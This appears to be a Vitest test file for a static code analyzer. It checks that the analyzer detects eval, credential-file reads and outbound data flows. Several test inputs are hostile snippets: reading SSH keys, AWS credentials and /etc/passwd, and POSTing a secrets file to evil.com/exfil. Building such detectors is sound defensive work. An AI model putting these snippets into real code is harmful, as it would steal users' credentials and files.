import { describe, it, expect } from 'vitest';
import { analyzeCode } from './ast-analyzer.js';

describe('AST Analyzer', () => {
  describe('Eval/exec detection', () => {
    it('detects eval()', () => {
      const code = 'const result = eval(userInput);';
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'eval-exec' && r.description.includes('eval'))).toBe(true);
    });

    it('detects new Function()', () => {
      const code = 'const fn = new Function("return " + input);';
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'eval-exec')).toBe(true);
    });
  });

  describe('Sensitive file access', () => {
    it('detects SSH key reading', () => {
      const code = `
        const fs = require('fs');
        const key = fs.readFileSync('/home/user/.ssh/id_rsa');
      `;
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('.ssh'))).toBe(true);
    });

    it('detects AWS credentials reading', () => {
      const code = `
        import { readFile } from 'fs/promises';
        const creds = await readFile('/home/user/.aws/credentials', 'utf-8');
      `;
      const results = analyzeCode(code);
      // The MemberExpression readFile detection looks for method calls
      expect(results.some(r => r.type === 'fs-access')).toBe(true);
    });

    it('detects /etc/passwd reading', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('/etc/passwd');
      `;
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'fs-access' && r.source?.includes('/etc/passwd'))).toBe(true);
    });
  });

  describe('Data flow: source to sink', () => {
    it('detects file data sent to fetch', () => {
      const code = `
        const fs = require('fs');
        const data = fs.readFileSync('./secrets.txt', 'utf-8');
        fetch('https://evil.com/exfil', { method: 'POST', body: data });
      `;
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'source-to-sink')).toBe(true);
    });
  });

  describe('Suspicious network calls', () => {
    it('detects non-HTTPS fetch', () => {
      const code = `fetch("http://evil.com/data");`;
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'suspicious-network')).toBe(true);
    });

    it('does not flag localhost', () => {
      const code = `fetch("http://localhost:3000/api");`;
      const results = analyzeCode(code);
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });

    it('does not flag HTTPS', () => {
      const code = `fetch("https://api.example.com/data");`;
      const results = analyzeCode(code);
      expect(results.filter(r => r.type === 'suspicious-network')).toHaveLength(0);
    });
  });

  describe('WebSocket detection', () => {
    it('detects WebSocket creation', () => {
      const code = `const ws = new WebSocket("ws://evil.com:4444");`;
      const results = analyzeCode(code);
      expect(results.some(r => r.type === 'suspicious-network' && r.sink === 'WebSocket')).toBe(true);
    });
  });

  describe('Safe code', () => {
    it('does not flag normal code', () => {
      const code = `
        const name = "Alice";
        console.log("Hello, " + name);
        const result = 2 + 2;
      `;
      const results = analyzeCode(code);
      expect(results).toHaveLength(0);
    });

    it('handles unparseable code gracefully', () => {
      const code = 'this is not valid javascript at all }{}{}{';
      const results = analyzeCode(code);
      // Should not throw, just return empty or partial results
      expect(Array.isArray(results)).toBe(true);
    });
  });
});
